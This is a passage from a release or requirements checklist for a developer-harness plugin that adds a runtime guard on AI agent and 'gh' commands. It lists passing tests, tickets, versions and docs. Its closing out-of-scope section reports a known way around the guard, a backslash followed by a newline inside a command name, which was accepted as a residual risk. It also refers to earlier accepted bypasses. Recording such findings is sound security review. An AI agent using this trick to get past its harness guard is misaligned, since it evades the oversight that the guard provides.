  - R4 to R7 Honored: the engine tests in `panel.engine.test.ts` (cases a to h, the four parts of the deny message, fail-open on a guard error) pass (QA of T-2704 and rounds 2 to 8).
  - R8 Honored: M1 pass, `<harness dir>/tasks/T-2704/evidence/m1-output.txt`: in bypass mode the `dh:qa-verifier` call was denied with the R6 message, and the `dh:release-manager` call printed the help text.
  - R9 Honored: ADR-005 has the amendment dated 2026-10-21 with "Alterado por" PRD-027, and the 2026-10-22 amendment that records amendments 6 to 8 and the bypasses of 2.4.
  - R10 to R16 Honored: the greps of the QA of T-2704 are clean; the counts stay at 13 agents, 19 + 1 commands and 14 templates; `dh validate` has 0 errors.
  - R17 Honored: version 0.32.1 in `internal/build/build.go`, `.claude-plugin/marketplace.json` and the source ref; `CHANGELOG.md` and both roadmaps have 0.32.1; a second build changes only `generated_at`; `dh validate` 0 errors, `go test ./...` passes, `claude plugin test` 250 pass, 0 fail (QA round 8). The clean-clone proof runs on the commit candidate before the push, and the PR body records its result.
  - R18 Honored: the PR touches `adapters/claude-code/plugin/hooks/**` and `.skills/external-clis/**`; the owner gave the merge ok on 2026-10-22.
  - R19 Honored: `dh validate` (`checkPrivatePaths`) passes.
- **Tickets:**
  - T-2701, `backend`, approved: QA round 8 PASS; code review `cli:codex/gpt-6-luna` approve in round 7.
  - T-2702, `backend` (kit source), approved: QA of T-2704 (greps of R9 to R15).
  - T-2703, `backend` (Go and docs), approved: QA round 8 (build, version, roadmap drift check of `dh validate`).
  - T-2704, `teste (unitário e integração)`, approved: M1 pass; QA round 8 PASS.
- **Docs:** `docs/adr/ADR-005-trava-de-runtime-por-mod.md`, `.agents/release-manager.md`, `.commands/review.md`, `.skills/external-clis/SKILL.md` and `references/opencode.md`, `clone-isolation.md`, `live-tree-freeze.md`, `agy.md`, `claude.md`, `gotchas.md`, `docs/tutorial.html`, `docs/en/tutorial.html`, `docs/roadmap.html`, `docs/en/roadmap.html`, `CHANGELOG.md`, `AGENTS.md` (line "Trava de `gh`").
- **Out of scope:** the items of section 5, and the accepted bypasses of 2.4. Security review round 7 found one more: a backslash followed by a newline inside a command name. The owner accepted it as a residual risk on 2026-10-22 (option "a"); its one-line mitigation is a candidate for a later release.
